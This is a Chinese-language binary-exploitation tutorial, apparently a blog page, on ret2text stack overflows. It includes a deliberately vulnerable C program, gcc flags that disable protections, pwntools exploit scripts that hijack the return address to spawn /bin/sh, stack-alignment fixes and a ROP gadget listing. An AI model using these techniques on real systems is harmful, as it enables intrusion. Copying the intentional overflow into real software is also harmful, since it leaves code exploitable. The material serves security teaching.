+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc ret2text.c -fno-stack-protector -no-pie -o ret2text_x64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ret2text/ret2text2.png"
+	width="353"
+	height="178"
+	srcset="/p/ret2text/ret2text2_hu6970957365299274604.png 480w, /p/ret2text/ret2text2_hu17999472143930727929.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+></p>
+<h3 id="exp-1">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="s1">&#39;./ret2text_x64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">funcAddr</span> <span class="o">=</span> <span class="mh">0x401146</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">funcAddr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;input:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="x64堆栈平衡">x64堆栈平衡
+</h3><p><strong>结果显示</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;./ret2text_x64&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid 157267<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> sending in interactive
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是由于64位机器在<strong>函数调用约定上要求栈在调用指令之前必须是16字节对齐的</strong></p>
+<p><a class="link" href="https://hack543.com/16-bytes-stack-alignment-movaps-issue/"  target="_blank" rel="noopener"
+    >16 Bytes Stack Alignment 的 MOVAPS 問題 - Hack543 &mdash; 16 Bytes Stack Alignment 的 MOVAPS 問題 - Hack543</a></p>
+<p><a class="link" href="https://blog.csdn.net/qq_41560595/article/details/112161243"  target="_blank" rel="noopener"
+    >ret2text涉及到的堆栈平衡问题_ret2text pie nx-CSDN博客</a></p>
+<p><strong>解决方案</strong></p>
+<ul>
+<li>
+<p>使用<code>execv()</code>代替<code>system()</code></p>
+<p><strong>在 64 位架构下，执行命令的函数通常需要注意堆栈平衡，以确保函数调用遵循 ABI 规范，并保证程序的正确性和稳定性。然而，有一种特殊的情况，即使用 <code>syscall</code> 指令直接调用系统调用（如 <code>execve</code>），可以不考虑堆栈平衡。这是因为 <code>syscall</code> 指令直接与内核交互，而不是通过常规的用户态函数调用机制。</strong></p>
+</li>
+<li>
+<p>手动进行16字节对齐</p>
+<p><strong>查找<code>ret</code>gadget地址</strong></p>
+<p><img src="/p/ret2text/ret2text3.png"
+	width="733"
+	height="214"
+	srcset="/p/ret2text/ret2text3_hu14095743509367133230.png 480w, /p/ret2text/ret2text3_hu8353026500810882595.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="822px"
+	
+></p>
+<p><strong>写入payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="s1">&#39;./ret2text_x64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">retAddr</span> <span class="o">=</span> <span class="mh">0x401016</span>  <span class="c1"># 查找到gadget地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">funcAddr</span> <span class="o">=</span> <span class="mh">0x401146</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 这样payload总共32字节，可以进行16字节对齐</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">padding</span>  <span class="c1"># 16字节</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">retAddr</span><span class="p">)</span>   <span class="c1"># 8字节</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">funcAddr</span><span class="p">)</span>  <span class="c1"># 8字节</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;input:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ret2text/ret2text4.png"
+	width="876"
+	height="425"
+	srcset="/p/ret2text/ret2text4_hu9239098648781552609.png 480w, /p/ret2text/ret2text4_hu8743270545286577159.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="494px"
+	
+></p>
+</li>
+</ul>
+<h1 id="函数传参">函数传参
+</h1><h2 id="函数调用约定">函数调用约定
+</h2><ul>
+<li>
+<p><strong>x86(32bit)</strong></p>
+<p>cdecl:参数<strong>从右到左</strong>入栈，<strong>调用者</strong>清理栈。                     <em><strong>常用于 c/c++ 程序</strong></em></p>
+<p>stdcall:参数<strong>从右到左</strong>入栈，<strong>被调用者</strong>清理栈。              <em><strong>常用于 windows api</strong></em></p>
+<p>fastcall:前两个参数使用 ECX 和 EDX 寄存器，其余参数从右到左入栈。</p>
+</li>
+<li>
+<p><strong>x86-64(64bit)</strong></p>
+<p>System V AMD64 ABI(大多数UNIX系统):前六个整数或指针类型的参数使用 RDI、RSI、RDX、RCX、R8 和 R9 寄存器传递，其余参数入栈。</p>
+<p>Microsoft x64:前四个参数使用 RCX、RDX、R8 和 R9 寄存器传递，其余参数入栈。</p>
+</li>
+<li>
+<p><strong>arm(32bit 64bit)</strong></p>
+<p>AAPCS:</p>
+<p>前<strong>四</strong>个参数使用 R0-R3 寄存器传递，其余参数入栈 <strong>(32-bit)</strong>。</p>
+<p>前<strong>八</strong>个参数使用 X0-X7 寄存器传递，其余参数入栈**(64-bit)**。</p>
+</li>
+</ul>
+<h2 id="x86-1">x86
+</h2><p><strong>源码变种</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// ret2text_args.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">sh</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 现在system需要传sh
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">dofunc</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;input:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">dofunc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果有这样的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sum</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span><span class="kt">int</span> <span class="n">arg2</span><span class="p">,</span><span class="kt">int</span> <span class="n">arg3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">arg1</span> <span class="o">+</span> <span class="n">arg2</span> <span class="o">+</span> <span class="n">arg3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于cdecl栈区的布局会像是这样的**(参数从右往左进栈)**</p>
+<p><img src="/p/ret2text/ret2text5.png"
+	width="437"
+	height="398"
+	srcset="/p/ret2text/ret2text5_hu4691492332086947298.png 480w, /p/ret2text/ret2text5_hu11138818776223704838.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="263px"
+	
+></p>
+<h3 id="编译调试">编译&amp;调试
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc ret2text_args.c -m32 -fno-stack-protector -no-pie -o ret2text_x86_args
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ret2text/dofunc9.png"
+	width="768"
+	height="311"
+	srcset="/p/ret2text/dofunc9_hu3214173742899456851.png 480w, /p/ret2text/dofunc9_hu1024967531331892425.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="592px"
+	
+></p>
+<p>输了8个a，需要覆盖掉<strong>0xffffd34c(func地址)<strong>和</strong>0xffffd350(参数地址)</strong>，总共要<strong>0x14</strong>个a</p>
+<p><img src="/p/ret2text/dofunc10.png"
+	width="710"
+	height="146"
+	srcset="/p/ret2text/dofunc10_hu558330846885185536.png 480w, /p/ret2text/dofunc10_hu9927056704275154113.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="486"
+		data-flex-basis="1167px"
+	
+></p>
+<h3 id="exp-2">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="s1">&#39;./ret2text_x86_args&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="mh">0x14</span>
+</span></span><span class="line"><span class="cl"><span class="n">funcAddr</span> <span class="o">=</span> <span class="mh">0x8049186</span>
+</span></span><span class="line"><span class="cl"><span class="n">randomAddr</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>  <span class="c1"># 用于满足cdecl函数调用约定的占位，是func执行后的地址，一般不关心</span>
+</span></span><span class="line"><span class="cl"><span class="n">bashAddr</span> <span class="o">=</span> <span class="mh">0x804c018</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">padding</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">funcAddr</span><span class="p">,</span> <span class="n">randomAddr</span><span class="p">,</span> <span class="n">bashAddr</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;input:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如果是call_func那么payload为<code>padding * b'a' + call_func_addr + bash_addr</code></strong></p>
+<p><img src="/p/ret2text/ret2text6.png"
+	width="1305"
+	height="503"
+	srcset="/p/ret2text/ret2text6_hu5992174363783453880.png 480w, /p/ret2text/ret2text6_hu18240779454788842403.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="622px"
+	
+></p>
+<p><em><strong>多个函数调用如何写 payload ？</strong></em></p>
+<h2 id="x64-1">x64
+</h2><p><strong>x64相比于x86在cdecl上优先使用寄存器来传递参数，劫持的关键在于控制寄存器的内容</strong></p>
+<p>涉及到的寄存器有<strong>rdi, rsi, rdx, rcx, r8, r9</strong></p>
+<p>寄存器无法传递的参数用栈传递</p>
+<p><img src="/p/ret2text/ret2text7.png"
+	width="1903"
+	height="789"
+	srcset="/p/ret2text/ret2text7_hu13974593107004430488.png 480w, /p/ret2text/ret2text7_hu7354781812429789429.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="578px"
+	
+></p>
+<p>设置返回地址为func的地址，寄存器rdi的值为&quot;/bin/sh&quot;的内存地址，理想情况下能运行一个shell，但是在<code>do_system</code>中遇到了16字节对齐，如果没有进行对齐CPU会触发一个一般保护故障，后续就无法取得shell</p>
+<p><strong>解决方案：</strong><a class="link" href="https://www.bilibili.com/video/BV15W4y1N7yN?vd_source=3fbb9ff8b655f394772248b334147569&amp;spm_id_from=333.788.player.switch"  target="_blank" rel="noopener"
+    >pwn技术分享—执行system前为何要执行retn指令_哔哩哔哩_bilibili</a></p>
+<h3 id="rop">ROP
+</h3><p>ROP（Return-Oriented Programming）编程是一种用于绕过程序安全保护的技术，特别是在存在栈溢出或缓冲区溢出漏洞时。</p>
+<p>ROP的核心思想就是把内存中的<strong>汇编代码片段</strong>组装成一系列的<strong>汇编代码块</strong>，每个代码片段的最后一个指令都要求能控制<strong>rip</strong>的值，这样的指令有<strong>call jmp pop</strong>，在栈上写入一系列gadget地址就可进行ROP,<strong>ROP的运行过程和链表非常类似</strong>。</p>
+<p><strong>在ret2text_x64中寻找的gadget</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Gadgets <span class="nv">information</span>
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">0x0000000000401057 : add al, byte ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x00000000004010bb : add bh, bh <span class="p">;</span> loopne 0x401125 <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401037 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x000000000040119b : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> leave <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401088 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> nop dword ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040115a : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040119c : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add cl, cl <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040112a : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add dword ptr <span class="o">[</span>rbp - 0x3d<span class="o">]</span>, ebx <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401039 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x000000000040119d : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> leave <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040108a : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> nop dword ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040115c : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401034 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> push <span class="m">0</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401044 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> push <span class="m">1</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401054 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> push <span class="m">2</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401009 : add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> <span class="nb">test</span> rax, rax <span class="p">;</span> je 0x401012 <span class="p">;</span> call rax
+</span></span><span class="line"><span class="cl">0x000000000040112b : add byte ptr <span class="o">[</span>rcx<span class="o">]</span>, al <span class="p">;</span> pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040119e : add cl, cl <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x00000000004010ba : add dil, dil <span class="p">;</span> loopne 0x401125 <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401047 : add dword ptr <span class="o">[</span>rax<span class="o">]</span>, eax <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x000000000040112c : add dword ptr <span class="o">[</span>rbp - 0x3d<span class="o">]</span>, ebx <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401127 : add eax, 0x2f03 <span class="p">;</span> add dword ptr <span class="o">[</span>rbp - 0x3d<span class="o">]</span>, ebx <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401128 : add ebp, dword ptr <span class="o">[</span>rdi<span class="o">]</span> <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> add dword ptr <span class="o">[</span>rbp - 0x3d<span class="o">]</span>, ebx <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401013 : add esp, <span class="m">8</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401012 : add rsp, <span class="m">8</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401010 : call rax
+</span></span><span class="line"><span class="cl">0x0000000000401143 : cli <span class="p">;</span> jmp 0x4010d0
+</span></span><span class="line"><span class="cl">0x0000000000401140 : endbr64 <span class="p">;</span> jmp 0x4010d0
+</span></span><span class="line"><span class="cl">0x000000000040100e : je 0x401012 <span class="p">;</span> call rax
+</span></span><span class="line"><span class="cl">0x00000000004010b5 : je 0x4010c0 <span class="p">;</span> mov edi, 0x404030 <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x00000000004010f7 : je 0x401100 <span class="p">;</span> mov edi, 0x404030 <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x000000000040103b : jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401144 : jmp 0x4010d0
+</span></span><span class="line"><span class="cl">0x00000000004010bc : jmp rax
+</span></span><span class="line"><span class="cl">0x000000000040119f : leave <span class="p">;</span> ret
